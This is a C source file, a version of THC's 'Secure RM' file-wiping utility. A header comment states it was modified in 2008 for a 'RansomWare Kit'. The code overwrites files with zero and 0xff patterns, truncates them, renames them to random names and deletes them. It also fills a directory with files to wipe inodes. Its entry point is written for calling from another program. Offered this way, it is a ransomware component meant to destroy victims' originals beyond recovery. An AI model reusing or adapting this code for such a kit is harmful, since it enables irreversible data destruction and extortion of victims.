/*
 * Secure RM - by van Hauser / [THC], vh@thc.org
 *
 * Secure ReMove first overwrites then renames and finally deletes the target
 * file(s) specified via parameters.
 * For security reasons full 32kb blocks are written so that the whole block
 * on which the file(s) live are overwritten. (change #define #BLOCKSIZE)
 * Standard mode is a real security wipe for 38 times, flushing
 * the caches after every write. The wipe technique was proposed by Peter
 * Gutmann at Usenix '96 and includes 10 random overwrites plus 28 special
 * defined characters. Take a look at the paper of him, it's really worth
 * your time. 
 * 
 *  The deletion process is as follows:
 * 
 *  1. The overwriting procedure (in the secure mode) does a 38 times
 *     overwriting. After each pass, the disk cache is flushed.
 *  2. truncating the file, so that an attacker don't know which
 *     diskblocks belonged to the file.
 *  3. renaming of the file, so that an attacker can't draw any conclusion
 *     from the filename on the contents of the deleted file.
 *  4. finally deleting the file (unlink). */

/* Modified by halfie in Sept, 2008 for RansomWare Kit 
 * PS: double overwriting of data is good enough for me */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#define MAXINODEWIPE    4194304 /* 22 bits */
#define BLOCKSIZE       32769 /* must be mod 3 = 0, should be >= 16k */
#define DIR_SEPERATOR   '/'  /* '/' on unix, '\' on dos/win */

unsigned char std_array_ff[3] = "\xff\xff\xff";
unsigned char std_array_00[3] = "\x00\x00\x00";

void __sdel_random_filename(char *filename) {
    int i;
    for (i = strlen(filename) - 1;
         (filename[i] != DIR_SEPERATOR) && (i >= 0);
         i--)
        if (filename[i] != '.') /* keep dots in the filename */
            filename[i] = 97+(int) ((int) ((256.0 * rand()) / (RAND_MAX + 1.0)) % 26);
}

void __sdel_fill_buf(unsigned char pattern[3], unsigned long bufsize, char *buf) {
    int loop; int where;
    
    for (loop = 0; loop < (bufsize / 3); loop++) {
        where = loop * 3;
    *buf++ = pattern[0];
    *buf++ = pattern[1];
    *buf++ = pattern[2];
    }
}

void __sdel_random_buf(unsigned long bufsize, char *buf) {
    int loop;
    
    for (loop = 0; loop < bufsize; loop++)
        *buf++ = (unsigned char) (256.0*rand()/(RAND_MAX+1.0));
}

/*
 * secure_overwrite function parameters:
 * mode = 0 : overwrite with random data and then overwrite 
 *            with 0xff.
 * fd       : filedescriptor of the target to overwrite
 * start    : where to start overwriting. 0 is from the beginning
 * bufsize  : size of the buffer to use for overwriting, depends on the filesystem
 * length   : amount of data to write (file size), 0 means until an error occurs
 *
 * returns 0 on success, -1 on errors
 */
int sdel_overwrite(int mode, int fd, long start, unsigned long bufsize,
           unsigned long length, int zero)
{
    unsigned long writes;
    unsigned long counter;
    char buf[65535];
    FILE *f;

    if ((f = fdopen(fd, "r+b")) == NULL)
        return -1;

    /* calculate the number of writes */
    if (length > 0)
        writes = (1 + (length / bufsize));
    else
        writes = 0;

    /* do the first overwrite */
    if (start == 0)
        rewind(f);
    else if (fseek(f, start, SEEK_SET) != 0)
        return -1;
        
    __sdel_fill_buf(std_array_00, bufsize, buf);
    if (writes > 0) 
        for (counter = 1; counter <= writes; counter++)
            fwrite(&buf, 1, bufsize, f);    // dont care for errors
    else
        do {}while (fwrite(&buf, 1, bufsize, f) == bufsize);

    fflush(f);
    #ifndef WIN32
    if (fsync(fd) < 0)
        sync();
    #endif

    /* do the second overwrite */
    if (start == 0)
        rewind(f);
    else if (fseek(f, start, SEEK_SET) != 0)
        return -1;
        
    __sdel_fill_buf(std_array_ff, bufsize, buf);
    if (writes > 0) 
        for (counter = 1; counter <= writes; counter++)
            fwrite(&buf, 1, bufsize, f);    // dont care for errors
    else
        do {}while (fwrite(&buf, 1, bufsize, f) == bufsize);

    fflush(f);
    #ifndef WIN32
    if (fsync(fd) < 0)
        sync();
    #endif

    (void)fclose(f);

    #ifndef WIN32
        sync();
    #endif
    return 0;
}


/*
 * secure_unlink function parameters:
 * filename   : the file or directory to remove
 * directory  : defines if the filename poses a directory
 * truncate   : truncate file
 * slow       : do things slowly, to prevent caching
 *
 * returns 0 on success, -1 on errors.
 */
int sdel_unlink(char *filename, int directory, int truncate, int slow)
{
    int fd;
    int turn = 0;
    int result;
    char newname[strlen(filename) + 1];
    struct stat filestat;

/* open + truncating the file, so an attacker doesn't know the diskblocks */
    if (!directory && truncate)
        if ((fd = open(filename, O_WRONLY | O_TRUNC | slow)) >= 0)
            close(fd);

/* Generate random unique name, renaming and deleting of the file */
    strcpy(newname, filename);  // not a buffer overflow as it has got the exact length

    do {
            __sdel_random_filename(newname);
        #ifndef WIN32
        if ((result = lstat(newname, &filestat)) >= 0)
        #else
        if ((result = stat(newname, &filestat)) >= 0)
        #endif
            turn++;
    }
    while ((result >= 0) && (turn <= 100));

    if (turn <= 100) {
        result = rename(filename, newname);
        if (result != 0) {
            fprintf(stderr, "Warning: Couldn't rename %s - ",
                filename);
            perror("");
            strcpy(newname, filename);
        }
    } else {
        fprintf(stderr,
            "Warning: Couldn't find a free filename for %s!\n",
            filename);
        strcpy(newname, filename);
    }

    //exit(0); //verify truncation + rename working!

    if (directory) {
        result = rmdir(newname);
        if (result) {
            printf("Warning: Unable to remove directory %s - ",
                   filename);
            perror("");
            (void)rename(newname, filename);
        }
    } else {
        result = unlink(newname);
        if (result) {
            printf("Warning: Unable to unlink file %s - ",
                   filename);
            perror("");
            (void)rename(newname, filename);
        }
    }

    if (result != 0)
        return -1;

    return 0;
}

void sdel_wipe_inodes(char *loc, char **array)
{
    char *template = malloc(strlen(loc) + 16);
    int i = 0;
    int fail = 0;
    int fd;

//    array = malloc(MAXINODEWIPE * sizeof(template));
    strcpy(template, loc);
    if (loc[strlen(loc) - 1] != '/')
        strcat(template, "/");
    strcat(template, "xxxxxxxx.xxx");

    while (i < MAXINODEWIPE && fail < 5) {
//        __sdel_random_filename(template);
        if (open(template, O_CREAT | O_EXCL | O_WRONLY, 0600) < 0)
            fail++;
        else {
            array[i] = malloc(strlen(template));
            strcpy(array[i], template);
            i++;
        }
    }

    if (fail < 5) {
        fprintf(stderr, "Warning: could not wipe all inodes!\n");
    }

    array[i] = NULL;
    fd = 0;
    while (fd < i) {
        unlink(array[fd]);
        free(array[fd]);
        fd++;
    }
    free(array);
    array = NULL;
}

#ifndef WIN32
    int slow = O_SYNC;
#else
    int slow = 0;
#endif
    
int recursive = 0;
int zero = 0;
unsigned long bufsize = BLOCKSIZE;
int fd;

int smash_it(char *filename, int mode)
{
    struct stat filestat;
    struct stat controlstat;
    int i_am_a_directory = 0;

    /* get the file stats */
    #ifndef WIN32
    if (lstat(filename, &filestat))
    #else
    if (stat(filename, &filestat))
    #endif
        return 1;

    if (S_ISREG(filestat.st_mode) && filestat.st_nlink > 1) {
        fprintf(stderr,
            "Error: File %s - file is hardlinked %d time(s), skipping!\n",
            filename, filestat.st_nlink - 1);
        return -1;
    }

    /* if the blocksize on the filesystem is bigger than the on compiled with, enlarge! */
    #ifndef WIN32
    if (filestat.st_blksize > bufsize) {
        if (filestat.st_blksize > 65532) {
            bufsize = 65535;
        } else {
            bufsize = (((filestat.st_blksize / 3) + 1) * 3);
        }
    }
    #endif

    if (S_ISREG(filestat.st_mode)) {

        /* open the file for writing in sync. mode */
        if ((fd = open(filename, O_RDWR | slow)) < 0) {
            /* here again this has a race problem ... hmmm */
            /* make it writable for us if possible */
            (void)chmod(filename, 0600);    /* ignore errors */
            if ((fd = open(filename, O_RDWR | slow)) < 0)
                return 1;
        }
        
        #ifndef WIN32
        fstat(fd, &controlstat);
        if ((filestat.st_dev != controlstat.st_dev)
            || (filestat.st_ino != controlstat.st_ino)
            || (!S_ISREG(controlstat.st_mode))) {
            close(fd);
            return 3;
        }
        #endif

        if (sdel_overwrite(mode, fd, 0, bufsize,filestat.st_size > 0 ? filestat.st_size : 1, zero) == 0)
            // exit(0); //verify if overwriting is working!
            return sdel_unlink(filename, 0, 1, slow);
    } /* end IS_REG() */
    else {
        if (S_ISDIR(filestat.st_mode)) {
            if (i_am_a_directory == 0) {
                fprintf(stderr,
                    "Warning: %s is a directory. I will not remove it, because the -r option is missing!\n",
                    filename);
                return 0;
            } else
                return sdel_unlink(filename, 1, 0, slow);
        } else if (!S_ISDIR(filestat.st_mode)) {
            fprintf(stderr,
                "Warning: %s is not a regular file, rename/unlink only!",
                filename);
            return sdel_unlink(filename, 0, 0, slow);
        }
    }

    return 99; // not reached
}

int mysrm(char *file)
{
    int result;

    #ifndef WIN32
        srand( (getpid()+getuid()+getgid()) ^ time(0) );
    #else   
        srand( time(0) );
    #endif

    /*if (argc < 2) {
        printf("USAGE: %s <filename>\n", argv[0]);
        exit(1);
    }*/

    char rmfile[strlen(file) + 1];
    strcpy(rmfile, file);

    if ((strcmp("/", rmfile) == 0) || (strcmp(".", rmfile) == 0) || (strcmp("..", rmfile) == 0)) {
        printf("DANGEREOUS target!\n");
        exit(1);
    }

    result = (int)smash_it(rmfile, 0);
    switch (result) {
    case 0: return 0;
    case 1:
        fprintf(stderr, "Error: File %s - ", rmfile);
        perror("");
        break;
    case -1:
        break;
    /*case 3:
        fprintf(stderr, "File %s was raced, hence I won't wipe it!\n",
            rmfile);
        break;
    default:
        fprintf(stderr, "Unknown error\n"); */
    }
    return 0;
}
